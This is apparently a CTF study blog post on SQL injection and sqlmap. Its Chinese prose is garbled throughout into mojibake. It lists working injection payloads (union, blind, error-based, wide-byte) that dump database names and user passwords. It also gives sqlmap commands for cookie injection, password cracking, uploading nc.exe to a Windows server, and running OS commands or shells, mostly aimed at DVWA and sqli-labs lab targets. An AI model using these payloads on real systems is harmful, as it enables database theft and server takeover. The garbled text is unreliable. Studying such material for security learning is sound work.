---
title: SQLæ³¨å…¥&CTFä¾‹é¢˜
date: 2021-09-06 17:17:22
tags:  CTF
category: CTF
---

# ä»‹ç»ä¸åŸç†ğŸ“–

## TIPS

1. çˆ†ä¸å‡ºæ¥ç»“æœè¯•è¯•åå…­è¿›åˆ¶ç¼–ç çš„åå­—ã€fromä¸å¯ï¼Œwhereå¯ã€‘ï¼Œåº“åä¹Ÿå¯ä»¥ç”¨å‡½æ•°database()ä»£æ›¿ã€[å‚è€ƒ](https://saucer-man.com/information_security/101.html)ã€‘

   - åå…­è¿›åˆ¶ï¼š**sqlè¯­å¥èƒ½ç”¨16è¿›åˆ¶åœ°æ–¹çš„æœ€å¥½ç”¨16è¿›åˆ¶ï¼Œå› ä¸ºå•å¼•å·åŒå¼•å·å¯èƒ½é€ æˆä¸€äº›é”™è¯¯**
   - ä¸å¯16è¿›åˆ¶ç¼–ç çš„åœ°æ–¹ï¼šsqlå…³é”®å­—ï¼šå¦‚fromã€selectã€fromåçš„åå­—ä¹Ÿä¸è¡Œ
   - å¯16è¿›åˆ¶çš„ï¼šwhereæ¡ä»¶çš„å­—æ®µã€å‡½æ•°å‚æ•°

2. ç›²æ³¨and or å¤±è´¥åè¯•å®½å­—èŠ‚æ³¨å…¥`%df%27 union select 1,2%23`  ã€**æŠ¥é”™å³æ³¨å…¥æˆåŠŸ**ã€‘

3. æµç¨‹ï¼š

   **ä¸€èˆ¬æ‰‹å·¥æ³¨å…¥çš„å§¿åŠ¿ä¸ºï¼šåˆ¤æ–­æ—¶ä»€ä¹ˆæ³¨å…¥ï¼Œæœ‰æ— è¿‡æ»¤å…³é”®è¯ --> è·å–æ•°æ®åº“ç”¨æˆ·ã€ç‰ˆæœ¬ã€å½“å‰æ•°æ®åº“ --> è·å–æ•°æ®åº“çš„æŸä¸ªè¡¨ --> è·å–å­—æ®µ --> è·å–æ•°æ®**

4. å‡ ä¸ªå¸¸ç”¨å‡½æ•°ï¼š

   1. version()â€”â€”MySQLç‰ˆæœ¬
   2. user()â€”â€”ç”¨æˆ·å
   3. database()â€”â€”æ•°æ®åº“å
   4. @@datadirâ€”â€”æ•°æ®åº“è·¯å¾„
   5. @@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬

5. è¿™é‡Œä¸€èˆ¬è¦ç”¨åˆ°è¿æ¥å‡½æ•°

   1. concat(str1,str2,...)ç›´æ¥è¿æ¥å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰åˆ†éš”ç¬¦
   2. concat_ws(separator, str1, str2,...)è¿æ¥å­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨separatoråˆ†å‰²
   3. group_concat()ç”¨æ¥è¿æ¥å¤šè¡Œçš„å€¼ï¼Œç”¨é€—å·åˆ†å‰²

6. <span style="background:#FF9999;">æ³¨æ„ï¼</span>ä¸åŒçš„å‚æ•°ä¸ä¸€å®šéƒ½èƒ½æ³¨å…¥ï¼Œç†è®ºä¸Šéƒ½å¯ä»¥ï¼Œä½†æ˜¯æœ‰çš„æ˜¯æ•°å­—æœ‰çš„æ˜¯å­—ç¬¦æ³¨æ„åŒºåˆ†ä¸åŒçš„æ³¨å…¥è¯­æ³•ï¼

7. burpsuite GETåé¢çš„å‚æ•°æ³¨å…¥æ—¶æ³¨æ„æŠŠç©ºæ ¼å˜æˆ`+`ï¼Œå¦åˆ™è®¤ä¸ºæ˜¯éš”å¼€ç¬¦

![](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439842.png)



## sqlmap

[ç®€ä¹¦å¸¸ç”¨å‘½ä»¤å¤§å…¨](https://www.jianshu.com/p/fa77f2ed788b)
[freebuf sqlmapæ€»ç»“ï¼Œå¤§å…¨ï¼Œã€å¾ˆå¤šã€‘](https://m.freebuf.com/sectool/164608.html)

[**ä¹Œäº‘ sqlmapæ‰‹å†Œ](https://wooyun.kieran.top/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C)

[æ€ç»´å¯¼å›¾çš„åšå®¢+å‘½ä»¤](https://www.cnblogs.com/bmjoker/p/9326258.html)

![2](https://img-blog.csdnimg.cn/20190311094049471.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70)



### æŠ€å·§ç‚¹

1. è¦ç™»é™†çš„ï¼Œç™»é™†åç”Ÿæˆcookieï¼Œsqlmapæ—¶è¦åŠ ä¸Š
  ```
sqlmap -u "http://127.0.0.1:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=low" --batch
  ```

2. å¯¹postè¯·æ±‚è¡¨å•å¼æ³¨å…¥ï¼Œå¯ç”¨ä¸¤ç§æ–¹æ³•
  - ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…å†…å®¹å¤åˆ¶ä¸‹æ¥ä¿å­˜åœ¨æ–‡æœ¬ä¸­ï¼Œç„¶åä½¿ç”¨SQLMap -rè¿›è¡Œpostæ³¨å…¥

```
sqlmap -r \Desktop\xxx.txt --batch
```
- ç›´æ¥ç”¨--data "è¡¨å•å‚æ•°ã€form dataã€‘"æˆ–--formsè‡ªåŠ¨è§£æè¡¨å•
```
sqlmap.py -u "http://127.0.0.1:8000/vulnerabilities/sqli/" --cookie="PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=medium" --data "id=1&Submit=Submit"
```
3. é’ˆå¯¹dvwaé«˜å®‰å…¨çº§åˆ«ä¸‹ï¼ŒHighçº§åˆ«çš„æŸ¥è¯¢æäº¤é¡µé¢ä¸æŸ¥è¯¢ç»“æœæ˜¾ç¤ºé¡µé¢ä¸æ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿæ²¡æœ‰æ‰§è¡Œ302è·³è½¬çš„[wp ](https://www.jianshu.com/p/e263ea40fe25)
- ç”¨`--second-order="xxxurl"`
- ä½¿ç”¨äºæŸ¥è¯¢æ•°æ®æäº¤ã€ç»“æœæ˜¾ç¤ºåˆ†åˆ«åœ¨2å„ä¸ªä¸åŒçš„é¡µé¢ä¸­
```
sqlmap --url="http://localhost:8001/dvwa/vulnerabilities/sqli/session-input.php" --data="id=1&Submit=Submit" --second-order="http://localhost:8001/dvwa/vulnerabilities/sqli/" --cookie="security=high; PHPSESSID=g5mep9dj1vmkjiha8qnpfpn2i7" --batch
```
 - ä¹Ÿå¯ä»¥ä¿å­˜æ–‡ä»¶åç”¨ç¬¬äºŒç§æ–¹æ³•å†--second
 - è¿™æ—¶sqli.txtæ–‡ä»¶ä¸­å¯¹åº”æ˜¯æŸ¥è¯¢æ•°æ®æäº¤æ—¶çš„POSTæ•°æ®åŒ…çš„å†…å®¹ï¼Œå…¶ä¸­å·²ç»åŒ…å«æœ‰cookieä¿¡æ¯ã€ä»¥åŠPOSTè¯·æ±‚ä½“ä¸­çš„Form dataæ•°æ®ï¼Œ**æ‰€ä»¥å‘½ä»¤ä¸­ä¸éœ€è¦å•ç‹¬åœ¨å†™**

4. é’ˆå¯¹æŸ¥è¯¢ç‰¹å®šåº“/è¡¨/å­—æ®µæŠ¥é”™çš„=ã€‹ç¼–ç ç»•è¿‡
> çˆ†è¡¨å:
> ?id=1%df%27 union select 1,2,table_name from information_schema.tables where table_schema=mydbs%23
> å‘ç°æŠ¥é”™ã€‚ã€‚ã€‚å¯èƒ½æœ‰è¿‡æ»¤
> é‚£ä¹ˆæŠŠmydbsè½¬æˆ16è¿›åˆ¶:0x6d79646273 (..å­—ç¬¦è½¬16è¿›åˆ¶å³å¯ï¼Œè¦è½¬å¯¹ï¼Œæœ‰ä¸ªç½‘å€16è¿›åˆ¶æ¢æ˜¯è½¬é”™çš„ã€‚ã€‚æµªè´¹æˆ‘å¥½å¤šæ—¶é—´)
> ?id=1%df%27 union select 1,2,table_name from information_schema.tables where table_schema=0x6d79646273%23

5. è®¾ç½®å…·ä½“sqlæ³¨å…¥æŠ€æœ¯

   --technique B å¸ƒå°”ç›²æ³¨

   --technique E æŠ¥é”™æ³¨å…¥

   --technique U unionæŸ¥è¯¢æ³¨å…¥

   --technique S å †å æ³¨å…¥

   --technique T æ—¶é—´ç›²æ³¨

   --technique Q å†…è”æŸ¥è¯¢æ³¨å…¥

   ```
   sqlmap -u http://192.168.1.121/sqli/Less-1/?id=1 --technique T --time-sec 3 --dbs 
   //--time -sec æ—¶é—´ç›²æ³¨æ—¶é—´ä¸º3
   ```

   

6.  **ä½¿ç”¨Sqlmapè¿›è¡ŒCookieæ³¨å…¥**
   
      åœ¨SQLmapä¸­æœ‰ä¸€ä¸ªå‚æ•°â€œ--Levelâ€,==å½“â€œleavel>=2â€æ—¶å°±ä¼šæ£€æµ‹COOKIEåé¢çš„å‚æ•°ï¼Œå½“â€œlevel>3â€æ—¶å°†ä¼šæ£€æµ‹User-Agentå’ŒReferer==,è¿™ä¸ºCOOKIEçš„æ³¨å…¥æä¾›äº†ä¾¿åˆ©ï¼š
   
      ```
      sqlmap -u  http://xxx.xx.xx.xx:xx/test.php  --cookie id=1 --dbs --leavel 2
      ```
   
      

7. åªæœ‰rootæ‰èƒ½è¯»å†™æ–‡ä»¶ï¼Œload_file

7. å¦‚æœä½ æƒ³çœ‹åˆ°sqlmapå‘é€çš„æµ‹è¯•payloadæœ€å¥½çš„ç­‰çº§å°±æ˜¯3ã€‚

9. é¿å…è¿‡å¤šçš„é”™è¯¯è¯·æ±‚è¢«å±è”½ï¼Œå¯ç”¨å‚æ•°

```
1ã€--safe-urlï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹ã€‚
2ã€--safe-freqï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯æ¬¡æµ‹è¯•è¯·æ±‚ä¹‹åéƒ½ä¼šå†è®¿é—®ä¸€è¾¹å®‰å…¨è¿æ¥ã€‚
```

10. æŒ‡å®šå‚æ•°ï¼š-p

    **sqlmapé»˜è®¤æµ‹è¯•æ‰€æœ‰çš„GETå’ŒPOSTå‚æ•°ï¼Œå½“--levelçš„å€¼å¤§äºç­‰äº2çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•HTTP Cookieå¤´çš„å€¼ï¼Œå½“å¤§äºç­‰äº3çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•User-Agentå’ŒHTTP Refererå¤´çš„å€¼ã€‚ä½†æ˜¯ä½ å¯ä»¥æ‰‹åŠ¨ç”¨-på‚æ•°è®¾ç½®æƒ³è¦æµ‹è¯•çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼š -p "id,user-anget"**

    

11. åœ¨æœ‰äº›æ—¶å€™webæœåŠ¡å™¨ä½¿ç”¨äº†URLé‡å†™ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥ä½¿ç”¨sqlmapæµ‹è¯•å‚æ•°ï¼Œå¯ä»¥åœ¨æƒ³æµ‹è¯•çš„å‚æ•°åé¢åŠ *

```
python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
sqlmapå°†ä¼šæµ‹è¯•value1çš„ä½ç½®æ˜¯å¦å¯æ³¨å…¥ã€‚
```

12. --prefixï¼šå‰ç¼€å’Œ--suffixï¼šåç¼€

    éœ€è¦åœ¨æ³¨å…¥çš„payloadçš„å‰é¢æˆ–è€…åé¢åŠ ä¸€äº›å­—ç¬¦ï¼Œæ¥ä¿è¯payloadçš„æ­£å¸¸æ‰§è¡Œã€‚

    ```
    python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "â€™)" --suffix "AND (â€™abcâ€™=â€™abc"
    
    $query = "SELECT * FROM users WHERE id=(â€™" . $_GET[â€™idâ€™] . "â€™) LIMIT 0, 1"; 
    è¿™æ ·æ‰§è¡Œçš„SQLè¯­å¥å˜æˆï¼š
    $query = "SELECT * FROM users WHERE id=(â€™1â€™) <PAYLOAD> AND (â€™abcâ€™=â€™abcâ€™) LIMIT 0, 1"; 
    ```

13. --level:æ¢æµ‹ç­‰çº§

    5ä¸ªç­‰çº§ï¼Œé»˜è®¤æ˜¯1

    **sqlmapä½¿ç”¨çš„payloadå¯ä»¥åœ¨xml/payloads.xmlä¸­çœ‹åˆ°ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ®ç›¸åº”çš„æ ¼å¼æ·»åŠ è‡ªå·±çš„payloadã€‚**

    HTTP Cookieåœ¨levelä¸º2çš„æ—¶å€™å°±ä¼šæµ‹è¯•ï¼ŒHTTP User-Agent/Refererå¤´åœ¨levelä¸º3çš„æ—¶å€™å°±ä¼šæµ‹è¯•ã€‚

    æ€»ä¹‹åœ¨ä½ **ä¸ç¡®å®šå“ªä¸ªpayloadæˆ–è€…å‚æ•°ä¸ºæ³¨å…¥ç‚¹çš„æ—¶å€™**ï¼Œä¸ºäº†ä¿è¯å…¨é¢æ€§ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„levelå€¼

14. --risk é£é™©ç­‰çº§

    å…±æœ‰å››ä¸ªé£é™©ç­‰çº§ï¼Œé»˜è®¤æ˜¯1ä¼šæµ‹è¯•å¤§éƒ¨åˆ†çš„æµ‹è¯•è¯­å¥ï¼Œ2ä¼šå¢åŠ åŸºäºäº‹ä»¶çš„æµ‹è¯•è¯­å¥ï¼Œ3ä¼šå¢åŠ ORè¯­å¥çš„SQLæ³¨å…¥æµ‹è¯•ã€‚

    ä¸ºä»€ä¹ˆå«é£é™©ï¼Œ**ä¾‹å¦‚åœ¨UPDATEçš„è¯­å¥ä¸­ï¼Œæ³¨å…¥ä¸€ä¸ªORçš„æµ‹è¯•è¯­å¥ï¼Œå¯èƒ½å¯¼è‡´æ›´æ–°çš„æ•´ä¸ªè¡¨ï¼Œå¯èƒ½é€ æˆå¾ˆå¤§çš„é£é™©ã€‚**

15. è¿˜å¯ä»¥çˆ†ç ´æ•°æ®åº“ç”¨æˆ·æ˜æ–‡å¯†ç **--passwords**

16. æš´åŠ›ç ´è§£

    **--common-tables**ï¼šæš´åŠ›ç ´è§£è¡¨å

    ```
    é€‚ç”¨ç¯å¢ƒï¼š
    å½“ä½¿ç”¨--tablesæ— æ³•è·å–åˆ°æ•°æ®åº“çš„è¡¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤å‚æ•°
    1.MySQLæ•°æ®åº“ç‰ˆæœ¬å°äº5.0ï¼Œæ²¡æœ‰information_schemaè¡¨ã€‚
    2ã€æ•°æ®åº“æ˜¯Microssoft Accessï¼Œç³»ç»Ÿè¡¨MSysObjectsæ˜¯ä¸å¯è¯»çš„ï¼ˆé»˜è®¤ï¼‰ã€‚
    3ã€å½“å‰ç”¨æˆ·æ²¡æœ‰æƒé™è¯»å–ç³»ç»Ÿä¸­ä¿å­˜æ•°æ®ç»“æ„çš„è¡¨çš„æƒé™ã€‚
    ```

**--common-columns**ï¼šæš´åŠ›ç ´è§£åˆ—å

17. è¯»æ–‡ä»¶ï¼š

    --file-read "C:/example.txt"

    ```
    å‰æ:æœ‰æƒé™ã€æ•°æ®åº“ä¸ºMySQLï¼ŒPostgreSQLæˆ–Microsoft SQL Server
    ```

18.ä¸Šä¼ æ–‡ä»¶

â€‹	--file-write,--file-destï¼Œå‰æï¼šå½“æ•°æ®åº“ä¸ºMySQLï¼ŒPostgreSQLæˆ–Microsoft SQL Serverï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šçš„å‡½æ•°ã€‚ä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æ–‡æœ¬ä¹Ÿå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

```
python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
```

19. è¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤

    **--os-cmd**

    --os-shell ï¼šä¹Ÿå¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®çš„shellï¼Œå¯ä»¥è¾“å…¥ä½ æƒ³æ‰§è¡Œçš„å‘½ä»¤

    ```
    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
    --os-cmd id
    ```

20. sqlmapè¿˜å¯ä»¥å’Œmsfè”åŠ¨ï¼Œ

    

21. æƒé™é—®é¢˜ï¼š

    ```
    é»˜è®¤æƒ…å†µä¸‹MySQLåœ¨Windowsä¸Šä»¥SYSTEMæƒé™è¿è¡Œï¼ŒPostgreSQLåœ¨Windowsä¸Linuxä¸­æ˜¯ä½æƒé™è¿è¡Œï¼ŒMicrosoft SQL Server 2000é»˜è®¤æ˜¯ä»¥SYSTEMæƒé™è¿è¡Œï¼ŒMicrosoft SQL Server 2005ä¸2008å¤§éƒ¨åˆ†æ˜¯ä»¥NETWORK SERVICEæœ‰æ—¶æ˜¯LOCAL SERVICEã€‚
    ```

    









## æ‰‹æ³¨

[ç®€ä¹¦ï¼Œsqlä¸€äº›å‡½æ•°æ€»ç»“ï¼Œç²¾ç®€ç»“åˆå®ä¾‹æ˜“ç†è§£](https://www.jianshu.com/p/fcc5d8e69d68)

[ç®€ä¹¦æ‰‹æ³¨åˆçº§ä¿å§†çº§æµç¨‹**](https://www.jianshu.com/p/54b630f1ec35)

1. æ¢æµ‹å­—æ®µæ•°ï¼šç”¨1ï¼Œ2ï¼Œ3æµ‹ï¼Œæˆ–order by2ï¼ˆæµ‹æ˜¯ä¸æ˜¯ä¸¤ä¸ªå­—æ®µï¼‰/3ï¼ˆæµ‹ä¸‰ä¸ªï¼‰
2. Mysqlå®‰è£…åé»˜è®¤ä¼šåˆ›å»ºä¸‰ä¸ªæ•°æ®åº“ï¼šinformation_schemaã€mysqlå’Œtest


###åˆ©ç”¨informationåº“æ‰‹æ³¨
3. è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·ã€å‡è®¾å­—æ®µä¸º2ã€‘
```
1' union select user(),2 #
```
4. è·å–æ‰€æœ‰æ•°æ®åº“åç§°ã€information_schemaåº“ä¸‹çš„schemataè¡¨ä¸­ä¿å­˜ç€DBMSä¸­çš„æ‰€æœ‰æ•°æ®åº“åç§°ä¿¡æ¯ã€‘
```
1' union select 1,schema_name from information_schema.schemata #
```

5. è·å–å½“å‰æ•°æ®åº“ä¸‹**æ‰€æœ‰è¡¨å**
```
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```
6. è·å–è¡¨ä¸­æ‰€æœ‰åˆ—å
```
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```
7. å¯¼å‡ºå…·ä½“æ•°æ®
- ä¸€æ¬¡æ€§è·å–usersè¡¨ä¸­**æ‰€æœ‰è¡Œçš„**userå’Œpasswordæ•°æ®ï¼Œç”¨ç¬¦åˆ'--'è¿æ¥æ¯ä¸€ç»„ä¸­userå’Œpasswordï¼Œæ¯ä¸€ç»„"user--password"åˆåˆ†åˆ«ç”¨é€—å·éš”å¼€ï¼Œé›†ä¸­åœ¨ä¸€èµ·è¾“å‡ºç»“æœ
```
1' union select 1,group_concat(concat_ws('--',user,password)) from users #
```
- æˆ–è€…åˆ†åˆ«è·å–æ¯ä¸€è¡Œæ•°æ®
```
1' union select 1,concat_ws('--',user,password) from users #
```

### æ³¨å…¥ç±»å‹
sqlmap æ”¯æŒ5ç§æ¼æ´æ£€æµ‹ç±»å‹:

- åŸºäºå¸ƒå°”çš„ç›²æ³¨æ£€æµ‹Â  (å¦‚æœä¸€ä¸ªurlçš„åœ°å€ä¸ºxxxx.php?id=1,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¸‹çš„åŠ ä¸Š and 1=1(å’Œæ²¡åŠ and1=1ç»“æœä¿æŒä¸€è‡´) å’Œ and 1=2(å’Œä¸åŠ and1=2ç»“æœä¸ä¸€è‡´),åˆ™æˆ‘ä»¬åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯å­˜åœ¨å¸ƒå°”æ³¨å…¥çš„. )
- åŸºäºæ—¶é—´çš„ç›²æ³¨æ£€æµ‹(å’ŒåŸºäºå¸ƒå°”çš„æ£€æµ‹æœ‰äº›ç±»ä¼¼.é€šè¿‡mysqlçš„ sleep(int)) æ¥è§‚å¯Ÿæµè§ˆå™¨çš„å“åº”æ˜¯å¦ç­‰å¾…äº†ä½ è®¾å®šçš„é‚£ä¸ªå€¼ å¦‚æœç­‰å¾…äº†,åˆ™è¡¨ç¤ºæ‰§è¡Œäº†sleep,åˆ™åŸºæœ¬ç¡®å®šæ˜¯å­˜åœ¨sqlæ³¨å…¥çš„
- åŸºäºé”™è¯¯çš„æ£€æµ‹ (ç»„åˆæŸ¥è¯¢è¯­å¥,çœ‹æ˜¯å¦æŠ¥é”™(åœ¨æœåŠ¡å™¨æ²¡æœ‰æŠ‘åˆ¶æŠ¥é”™ä¿¡æ¯çš„å‰æä¸‹),==å¦‚æœæŠ¥é”™ åˆ™è¯æ˜æˆ‘ä»¬ç»„åˆçš„æŸ¥è¯¢è¯­å¥ç‰¹å®šçš„å­—ç¬¦è¢«åº”ç”¨äº†==,å¦‚æœä¸æŠ¥é”™,åˆ™æˆ‘ä»¬è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦å¾ˆå¯èƒ½è¢«æœåŠ¡å™¨ç»™è¿‡æ»¤æ‰(ä¹Ÿå¯èƒ½æ˜¯æŠ‘åˆ¶äº†é”™è¯¯è¾“å‡º.))
- åŸºäºunionè”åˆæŸ¥è¯¢çš„æ£€æµ‹(é€‚ç”¨äºå¦‚æœæŸä¸ªwebé¡¹ç›®å¯¹æŸ¥è¯¢ç»“æœåªå±•ç¤ºä¸€æ¡è€Œæˆ‘ä»¬éœ€è¦å¤šæ¡çš„æ—¶å€™ åˆ™ä½¿ç”¨unionè”åˆæŸ¥è¯¢æ­é…concatè¿˜è¿›è¡Œè·å–æ›´å¤šçš„ä¿¡æ¯)
-  åŸºäºå †å æŸ¥è¯¢çš„æ£€æµ‹(é¦–å…ˆçœ‹æœåŠ¡å™¨æ”¯ä¸æ”¯æŒå¤šè¯­å¥æŸ¥è¯¢,ä¸€èˆ¬æœåŠ¡å™¨sqlè¯­å¥éƒ½æ˜¯å†™æ­»çš„,æŸäº›ç‰¹å®šçš„åœ°æ–¹ç”¨å ä½ç¬¦æ¥æ¥å—ç”¨æˆ·è¾“å…¥çš„å˜é‡,è¿™æ ·å³ä½¿æˆ‘ä»¬åŠ and ä¹Ÿåªèƒ½æ‰§è¡Œselect(ä¹Ÿä¸ä¸€å®šselect,ä¸»è¦çœ‹åº”ç”¨åœºæ™¯,æ€»ä¹‹å°±æ˜¯æœåŠ¡ç«¯å†™äº†ä»€ä¹ˆ,ä½ å°±èƒ½æ‰§è¡Œä»€ä¹ˆ)æŸ¥è¯¢è¯­å¥,å¦‚æœèƒ½æ’å…¥åˆ†å·;åˆ™æˆ‘ä»¬åé¢å¯ä»¥è‡ªå·±ç»„åˆupdate,insert,deleteç­‰è¯­å¥æ¥è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œ)


### æ•°å­—å‹æ³¨å…¥å’Œå­—ç¬¦å‹æ³¨å…¥
[ç®€ä¹¦ï¼Œç²¾ç®€**](https://www.jianshu.com/p/5edd7a58a69e)

1. ä¸€ä¸ªå‚æ•°æ˜¯intï¼Œä¸€ä¸ªæ˜¯string
2. è¾“å…¥`1 and 1=2`ï¼ŒæŠ¥é”™å³ä¸ºæ•°å­—å‹æ³¨å…¥ã€æ‰§è¡Œandé€»è¾‘åˆ¤æ–­ã€‘ï¼Œå¦åˆ™ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼ˆå­—ç¬¦ä¸²å†…çš„`1 and 1=2`ä¸æ‰§è¡Œandé€»è¾‘åˆ¤æ–­ï¼‰ï¼Œè¦å»åˆ©ç”¨å•å¼•å·é—­åˆæ¥æ³¨å…¥
3. æ•°å­—å‹ä¸éœ€è¦å•å¼•å·æ¥é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦é€šè¿‡å•å¼•å·æ¥é—­åˆçš„

### æœç´¢æ³¨å…¥
[ä¸ªäººåšå®¢ï¼Œç²¾ç®€](https://www.codenong.com/cs106446931/)
ç±»ä¼¼å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸è¿‡å‚æ•°å¤„å˜æˆ`'%xxx%'`  ï¼Œæ³¨æ„è¦ç»•è¿‡%
- å‡ ç§ç»•è¿‡æ–¹æ³•ï¼š
```
'and 1=1 and '%'='

%' and 1=1--'

%' and 1=1 and '%'='
```
eg:
```
ä¾‹å¦‚æˆ‘ä»¬åœ¨æœç´¢æ¡†è¾“å…¥ æ%â€˜andâ€™1â€™=â€˜1â€™ and%â€™=â€™
SELECT * from table where users likeâ€™%æ%â€˜andâ€™1â€™=â€˜1â€™andâ€™%â€™=â€™%â€™
```
- å‰©ä½™çˆ†åº“æ‰‹æ®µå¤§ä½“ç­‰äºå­—ç¬¦æ³¨å…¥


### å¸ƒå°”ç›²æ³¨
[ç®€å•ï¼Œç®€ä¹¦æ‰‹å·¥å¸ƒå°”ç›²æ³¨](http://127.0.0.1/sqli-labs/Less-8/?id=1â€˜)

å°ä¾‹å­ï¼š
- æŸ¥è¯¢å­—æ®µåä¸­åŒ…å« username çš„è¡¨
```
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```
- æŸ¥è¡¨å
```
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```

1. é€šè¿‡æ„é€ sqlè¯­å¥ï¼Œé€šè¿‡åˆ¤æ–­è¯­å¥æ˜¯å¦**æ‰§è¡ŒæˆåŠŸ**æ¥å¯¹æ•°æ®è¿›è¡ŒçŒœè§£ã€‚ã€æ— å›æ˜¾ï¼Œåªè¿”å›å¯¹é”™ã€‘
2. **åªè¿”å›true/falseï¼Œä¸è¿”å›æŠ¥é”™**ã€è¿”å›æŠ¥é”™åˆ™è¯´æ˜æœ‰unionæ³¨å…¥ã€‘
3. ä¾‹å¦‚:

  	å…ˆåˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦
  `http://127.0.0.1/sqli-labs/Less-8/?id=1' and length(database())>8 --+`
å‘ç°è¯´æ˜ç­‰çº§8çš„æ—¶å€™ï¼Œé¡µé¢å°±æ²¡æœ‰æ˜¾ç¤ºã€‚é‚£ä¹ˆè¯´æ˜databaseï¼ˆï¼‰çš„é•¿åº¦æ˜¯8

4. å¸¸ç”¨å‡½æ•°åŠæ³¨å…¥æŠ€å·§

```
#left (a, b)ä»å·¦ä¾§æˆªå–açš„å‰bä½ â—æ³¨æ„æ˜¯å‰å‡ ä½ï¼Œä¸æ˜¯ç¬¬å‡ ä½
left (database(),1)

ord=ascii 
ascii(x)=97 åˆ¤æ–­xçš„asciiç æ˜¯å¦ç­‰äº97
```

ğŸ”´<span style="background:#FF9999;">æ³¨æ„ï¼šmidç¬¬äºŒä¸ªå‚æ•°ä»1å¼€å§‹,</span>

ğŸŸ <span style="background:#FFFFBB;">limitç¬¬ä¸€ä¸ªå‚æ•°ä»0å¼€å§‹</span>



![](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041459346.jpeg)



### æŠ¥é”™æ³¨å…¥

[***ä¸ªäººåšå®¢ç‹å¹ä¹‹æ€»ç»“ï¼Œå®å…¸](https://www.cnblogs.com/wangtanzhi/p/12577891.html)

[ç®€ä¹¦ 12ç§æŠ¥é”™æ³¨å…¥+ä¸‡èƒ½è¯­å¥ï¼Œç®€æ´](https://www.jianshu.com/p/bc35f8dd4f7c)

#### pow()æº¢å‡ºæŠ¥é”™æ³¨å…¥

- è¦ç‚¹ï¼šæŸ¥è¯¢æ­£ç¡®ä¼šå› ä¸ºpowæº¢å‡ºè€ŒæŠ¥é”™ï¼Œå¦åˆ™ä¸æŠ¥é”™åªæ˜¯è¯´æŸ¥è¯¢ä¸åˆ°=ã€‹æŸ¥è¯¢å‡ºé”™ï¼Œç±»ä¼¼å¸ƒå°”æ³¨å…¥

```mysql
select 1 and case1 and pow(999,999)å‘ç”ŸæŠ¥é”™ï¼Œè¯´æ˜case1ä¸ºçœŸ
select 1 and case2 and pow(999,999)æ²¡æŠ¥é”™ï¼Œåªæ˜¯æŸ¥è¯¢ä¸åˆ°ï¼Œè¯´æ˜case2ä¸ºå‡
caseå¯ä»¥ä½œä¸ºæˆ‘ä»¬ç”¨æ¥åˆ¤æ–­çš„è¯­å¥ï¼Œè¿›è¡Œå¸ƒå°”ç›²æ³¨
```



- <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439843.png" alt="image-20210522142152524" style="zoom:67%;" />

#### join..using

1. ç”¨æ³•ï¼šMySQL çš„ JOIN åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨ä¸­æŸ¥è¯¢æ•°æ®ã€‚ã€[èœé¸Ÿæ•™ç¨‹](https://www.runoob.com/mysql/mysql-join.html)ã€[csdnä¾‹å­åŠ æ•™ç¨‹](https://blog.csdn.net/weixin_46706771/article/details/112769113)ã€‘
2. æœ‰é‡å¤çš„åˆ—åæ—¶æŠ¥é”™å¹¶è¿”å›ä¸€ä¸ªé‡å¤çš„åˆ—å
